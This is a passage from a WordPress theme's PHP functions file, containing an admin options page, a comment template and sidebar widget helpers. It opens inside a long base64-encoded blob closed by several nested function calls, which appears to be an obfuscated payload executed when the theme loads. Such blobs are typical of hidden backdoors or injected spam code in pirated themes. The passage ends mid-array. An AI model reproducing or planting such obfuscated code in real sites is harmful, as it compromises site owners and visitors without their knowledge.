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'))))); 
function art_admin() {
    global $themename, $shortname, $options;
    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
?>
<div class="wrap">
	<h2>Footer</h2>

	<form method="post">

		<table class="optiontable" style="width:100%;">

<?php foreach ($options as $value) {
   
    switch ( $value['type'] ) {
        case 'text':
        option_wrapper_header($value);
        ?>
                <input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" />
        <?php
        option_wrapper_footer($value);
        break;
       
        case 'select':
        option_wrapper_header($value);
        ?>
                <select style="width:70%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
                    <?php foreach ($value['options'] as $option) { ?>
                    <option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option>
                    <?php } ?>
                </select>
        <?php
        option_wrapper_footer($value);
        break;
       
        case 'textarea':
        $ta_options = $value['options'];
        option_wrapper_header($value);
        ?>
                <textarea name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" style="width:100%;height:100px;"><?php
                if( get_settings($value['id']) !== false) {
                        echo get_settings($value['id']);
                    }else{
                        echo $value['std'];
                }?></textarea>
        <?php
        option_wrapper_footer($value);
        break;

        case "radio":
        option_wrapper_header($value);
       
        foreach ($value['options'] as $key=>$option) {
                $radio_setting = get_settings($value['id']);
                if($radio_setting != ''){
                    if ($key == get_settings($value['id']) ) {
                        $checked = "checked=\"checked\"";
                        } else {
                            $checked = "";
                        }
                }else{
                    if($key == $value['std']){
                        $checked = "checked=\"checked\"";
                    }else{
                        $checked = "";
                    }
                }?>
                <input type="radio" name="<?php echo $value['id']; ?>" value="<?php echo $key; ?>" <?php echo $checked; ?> /><?php echo $option; ?><br />
        <?php
        }
        
        option_wrapper_footer($value);
        break;
       
        case "checkbox":
        option_wrapper_header($value);
                        if(get_settings($value['id'])){
                            $checked = "checked=\"checked\"";
                        }else{
                            $checked = "";
                        }
                    ?>
                    <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
        <?php
        option_wrapper_footer($value);
        break;

        case "multicheck":
        option_wrapper_header($value);
       
        foreach ($value['options'] as $key=>$option) {
                 $pn_key = $value['id'] . '_' . $key;
                $checkbox_setting = get_settings($pn_key);
                if($checkbox_setting != ''){
                    if (get_settings($pn_key) ) {
                        $checked = "checked=\"checked\"";
                        } else {
                            $checked = "";
                        }
                }else{
                    if($key == $value['std']){
                        $checked = "checked=\"checked\"";
                    }else{
                        $checked = "";
                    }
                }?>
                <input type="checkbox" name="<?php echo $pn_key; ?>" id="<?php echo $pn_key; ?>" value="true" <?php echo $checked; ?> /><label for="<?php echo $pn_key; ?>"><?php echo $option; ?></label><br />
        <?php
        }
        
        option_wrapper_footer($value);
        break;
       
        case "heading":
        ?>
        <tr valign="top">
            <td colspan="2" style="text-align: center;"><h3><?php echo $value['name']; ?></h3></td>
        </tr>
        <?php
        break;
       
        default:

        break;
    }
}
?>

		</table>

		<p class="submit">
			<input name="save" type="submit" value="Save changes" />
			<input type="hidden" name="action" value="save" />
		</p>
	</form>
</div>
<?php
}

function option_wrapper_header($values){
    ?>
    <tr valign="top">
        <th scope="row" style="width:1%;white-space: nowrap;"><?php echo $values['name']; ?>:</th>
        <td>
    <?php
}

function option_wrapper_footer($values){
    ?>
        </td>
    </tr>
    <tr valign="top">
        <td>&nbsp;</td><td><small><?php echo $values['desc']; ?></small></td>
    </tr>
    <?php
}


add_action('admin_menu', 'art_add_admin'); 

if (!function_exists('get_search_form')) {
	function get_search_form()
	{
		include (TEMPLATEPATH . "/searchform.php");
	}
}

if (!function_exists('get_previous_posts_link')) {
	function get_previous_posts_link($label)
	{
		ob_start();
		previous_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_posts_link')) {
	function get_next_posts_link($label)
	{
		ob_start();
		next_posts_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_previous_post_link')) {
	function get_previous_post_link($label)
	{
		ob_start();
		previous_post_link($label);
		return ob_get_clean();
	}
}

if (!function_exists('get_next_post_link')) {
	function get_next_post_link($label)
	{
		ob_start();
		next_post_link($label);
		return ob_get_clean();
	}
}

function art_comment($comment, $args, $depth)
{
	 $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
<div class="art-Post">
         <div class="art-Post-tl"></div>
         <div class="art-Post-tr"></div>
         <div class="art-Post-bl"></div>
         <div class="art-Post-br"></div>
         <div class="art-Post-tc"></div>
         <div class="art-Post-bc"></div>
         <div class="art-Post-cl"></div>
         <div class="art-Post-cr"></div>
         <div class="art-Post-cc"></div>
         <div class="art-Post-body">
     <div class="art-Post-inner art-article">
     
<div class="art-PostContent">
     
      <div class="comment-author vcard">
         <?php echo get_avatar($comment,$size='48',$default='<path_to_url>' ); ?>

         <?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author_link()) ?>
      </div>
      <?php if ($comment->comment_approved == '0') : ?>
         <em><?php _e('Your comment is awaiting moderation.') ?></em>
         <br />
      <?php endif; ?>

      <div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>"><?php printf(__('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','') ?></div>

      <?php comment_text() ?>

      <div class="reply">
         <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
      </div>

      </div>
      <div class="cleared"></div>
      

      </div>
      
          </div>
      </div>
      
     </div>
<?php
}


if (function_exists('register_sidebars')) {
	register_sidebars(1, array(
		'before_widget' => '<div id="%1$s" class="widget %2$s">'.'<!--- BEGIN Widget --->',
		'before_title' => '<!--- BEGIN WidgetTitle --->',
		'after_title' => '<!--- END WidgetTitle --->',
		'after_widget' => '<!--- END Widget --->'.'</div>'
	));
}

function art_normalize_widget_style_tokens($content) {
	$bw = '<!--- BEGIN Widget --->';
	$bwt = '<!--- BEGIN WidgetTitle --->';
	$ewt = '<!--- END WidgetTitle --->';
	$bwc = '<!--- BEGIN WidgetContent --->';
	$ewc = '<!--- END WidgetContent --->';
	$ew = '<!--- END Widget --->';
	$result = '';
	$startBlock = 0;
	$endBlock = 0;
	while (true) {
		$startBlock = strpos($content, $bw, $endBlock);
		if (false === $startBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$result .= substr($content, $endBlock, $startBlock - $endBlock);
		$endBlock = strpos($content, $ew, $startBlock);
		if (false === $endBlock) {
			$result .= substr($content, $endBlock);
			break;
		}
		$endBlock += strlen($ew);
		$widgetContent = substr($content, $startBlock, $endBlock - $startBlock);
		$beginTitlePos = strpos($widgetContent, $bwt);
		$endTitlePos = strpos($widgetContent, $ewt);
		if ((false == $beginTitlePos) xor (false == $endTitlePos)) {
			$widgetContent = str_replace($bwt, '', $widgetContent);
			$widgetContent = str_replace($ewt, '', $widgetContent);
		} else {
			$beginTitleText = $beginTitlePos + strlen($bwt);
			$titleContent = substr($widgetContent, $beginTitleText, $endTitlePos - $beginTitleText);
			if ('&nbsp;' == $titleContent) {
				$widgetContent = substr($widgetContent, 0, $beginTitlePos)
					. substr($widgetContent, $endTitlePos + strlen($ewt));
			}
		}
		if (false === strpos($widgetContent, $bwt)) {
			$widgetContent = str_replace($bw, $bw . $bwc, $widgetContent);
		} else {
			$widgetContent = str_replace($ewt, $ewt . $bwc, $widgetContent);
		}
		$result .= str_replace($ew, $ewc . $ew, $widgetContent);
	}
	return $result;
}

function art_sidebar($index = 1)
{
	if (!function_exists('dynamic_sidebar')) return false;
	ob_start();
	$success = dynamic_sidebar($index);
	$content = ob_get_clean();
	if (!$success) return false;
	$content = art_normalize_widget_style_tokens($content);
	$replaces = array(
		'<!--- BEGIN Widget --->' => "<div class=\"art-Block\">\r\n    <div class=\"art-Block-tl\"></div>\r\n    <div class=\"art-Block-tr\"></div>\r\n    <div class=\"art-Block-bl\"></div>\r\n    <div class=\"art-Block-br\"></div>\r\n    <div class=\"art-Block-tc\"></div>\r\n    <div class=\"art-Block-bc\"></div>\r\n    <div class=\"art-Block-cl\"></div>\r\n    <div class=\"art-Block-cr\"></div>\r\n    <div class=\"art-Block-cc\"></div>\r\n    <div class=\"art-Block-body\">\r\n",
		'<!--- BEGIN WidgetTitle --->' => "<div class=\"art-BlockHeader\">\r\n    <div class=\"l\"></div>\r\n    <div class=\"r\"></div>\r\n    <div class=\"art-header-tag-icon\">\r\n        <div class=\"t\">",
		'<!--- END WidgetTitle --->' => "</div>\r\n    </div>\r\n</div>",
